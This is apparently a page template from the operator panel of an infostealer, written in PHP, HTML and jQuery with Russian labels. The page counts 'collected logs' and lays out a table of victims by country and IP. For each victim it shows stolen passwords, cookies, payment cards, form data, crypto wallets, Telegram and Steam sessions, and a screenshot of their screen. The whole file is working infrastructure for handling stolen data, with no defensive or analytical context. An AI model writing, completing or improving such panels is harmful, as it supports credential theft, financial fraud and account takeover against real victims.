<div class="row">
	<div class="col-sm-12 col-md-6 col-lg-3 stretch-card grid-margin">
		<div class="card">
			<div class="card-body">
				<div class="d-flex align-items-center justify-content-between">
					<i class="fas icon-lg fa-history text-danger"></i>
					<div>
						<p class="mb-0 text-right">Всего лога(-ов)</p>
						<h3 class="font-weight-medium text-right mb-0" id="all_time_logs_count">Загрузка...</h3>
					</div>
				</div>
				<p class="text-muted mt-3 mb-0">На данный момент</p>
			</div>
		</div>
	</div>
	<div class="col-sm-12 col-md-6 col-lg-3 stretch-card grid-margin">
		<div class="card">
			<div class="card-body">
				<div class="d-flex align-items-center justify-content-between">
					<i class="fas fa-calendar-alt icon-lg text-warning"></i>
					<div>
						<p class="mb-0 text-right">За месяц</p>
						<h3 class="font-weight-medium text-right mb-0" id="month_logs_count">Загрузка...</h3>
					</div>
				</div>
				<p class="text-muted mt-3 mb-0">За последний месяц</p>
			</div>
		</div>
	</div>
	<div class="col-sm-12 col-md-6 col-lg-3 stretch-card grid-margin">
		<div class="card">
			<div class="card-body">
				<div class="d-flex align-items-center justify-content-between">
					<i class="fas fa-calendar-week icon-lg text-success"></i>
					<div>
						<p class="mb-0 text-right">За неделю</p>
						<h3 class="font-weight-medium text-right mb-0" id="week_logs_count">Загрузка...</h3>
					</div>
				</div>
				<p class="text-muted mt-3 mb-0">На этой неделе</p>
			</div>
		</div>
	</div>
	<div class="col-sm-12 col-md-6 col-lg-3 stretch-card grid-margin">
		<div class="card">
			<div class="card-body">
				<div class="d-flex align-items-center justify-content-between">
					<i class="fas fa-calendar-day icon-lg text-primary"></i>
					<div>
						<p class="mb-0 text-right">За 24ч</p>
						<h3 class="font-weight-medium text-right mb-0" id="today_logs_count">Загрузка...</h3>
					</div>
				</div>
				<p class="text-muted mt-3 mb-0">Сегодня</p>
			</div>
		</div>
	</div>
</div>

<div class="row">
	<div class="col-12">
		<div class="card">
			<div class="card-body">
				<h4 class="card-title">Собранные вами логи</h4>

				<div class="table-responsive">
					<table class="table" id="table-spamers">
						<thead>
							<tr>
								<th scope="col">#</th>
								<th scope="col">Страна/IP</th>
								<th scope="col">Данные</th>
								<th scope="col">Дата</th>
								<th scope="col">Скриншот</th>
							</tr>
						</thead>
					</table>
				</div>
			</div>
		</div>
	</div>
</div>



<script>
	var table;
	var extra_info = [];

	$(document).ready(function() {
		table = $("#table-spamers").DataTable({
        	dom: '<"d-sm-flex justify-content-start"l>t<"d-sm-flex justify-content-end"p>',
	        ajax: {
	            "url": "/logs/getTable/logs",
	            "type": "POST",
	            "data": function ( d ) {
	                d.token = "<?=$token?>";
	            }
	        },
	        columns: 
	        [
	            { 
	            	responsivePriority: 5,
	            	orderable: false,
	            	data: function(row, type, val, meta) {
		        		return meta.row + 1;
		        	} 
	            },
	            { 
	            	responsivePriority: 6,
	            	data:  "address[]",
	                render: function(data, type, row) {
	                	if(type == "display") {
							return "<div class='d-flex align-items-center justify-content-between'><div><span>Страна: " + data[0] + "(" + data[1] + ")</span><br><span>IP: " + data[2] + "</span></div><img class='country-img' data-placement=\"top\" data-toggle='tooltip' title='Страна: " + data[0] + "' src='/public/img/countryflags/" + data[1] + ".png' /></div>";
	                	}
				        else {
				        	return data[1];
				        }
	                	
	                },
	                type: "string",
	            },
	            { 
		        	responsivePriority: 2,
		        	data: function ( row, type, val, meta ) {
		        		return row['data'];
		        	},
		        	render: function(data, type, row) {
		        		if(type == "display") {
		        			result = "<i class='fal fa-key table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Пароли'></i> " + data['passwords'] + " " +
		                    "<i class='fal fa-cookie-bite table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Куки'></i> " + data['cookies'] + " " +
		                    "<i class='fal fa-credit-card-front table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Карты'></i> " + data['cards'] + " " +
		                    "<i class='fal fa-address-card table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Формы'></i> " + data['forms'] + ' ' +
		                    "<i class='fal fa-wallet table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Кошельки'></i> " + data['wallets'] + ' ' +
		                    "<i class='fab fa-telegram-plane table-data-icon' data-placement=\"bottom\" data-toggle='tooltip' title='Телеграм'></i> " + data['telegram'] + ' ' +
		                    "<i class='fab fa-steam table-data-icon' data-placement=\"top\" data-toggle='tooltip' title='Стим'></i> " + data['steam'] + "<br>";
		            		
		            		if(data['dds_passwords'].length > 0) {
		            			for(i in data['dds_passwords']) {
			            			result += "<span class='" + (i!=0?"ml-1 ":"") + "mt-1 badge badge-info'><i class='fal fa-key'></i> " + data['dds_passwords'][i] + "</span>";
			            		}

		            			result += "<br>";
		            		}
		            		

		            		for(i in data['dds_cookies']) {
		            			result += "<span class='" + (i!=0?"ml-1 ":"") + "mt-1 badge badge-warning'><i class='fal fa-cookie-bite'></i> " + data['dds_cookies'][i] + "</span>";
		            		}
		            		return result;
		        		}
		                else
		                	return data;
		        	},
		        	type: "num", 
		        },
	            { 
	            	responsivePriority: 4,
	            	data: "date" 
	            },
				{ 
	            	orderable: false,
	            	responsivePriority: 7,
	            	data: "screenshot", 
	            	render: function(data, type, row) {
            			return "<a href=\"" + data + "\" class=\"logs-screen\"><img src=\"" + data + "\"></a>";
	            	},
	            },
	        ],
	        order: [[ 3, "desc" ]],
	    });

	    data = sendData("/logs/statistic/count", {token: "<?=$token?>"});
		if(data) {
			$("#all_time_logs_count").text(data.data[0]["all"] + " шт.");
			$("#month_logs_count").text(data.data[0]["month"] + " шт.");
			$("#week_logs_count").text(data.data[0]["week"] + " шт.");
			$("#today_logs_count").text(data.data[0]["today"] + " шт.");
		}
	});

	$("#table-spamers").on( 'draw.dt', function () {
	    $("#table-spamers [data-toggle=\"tooltip\"]").tooltip({
	        delay: { "show": 100, "hide": 1000 }
	    });

	    $(".logs-screen").magnificPopup({type:"image"});
	});
</script>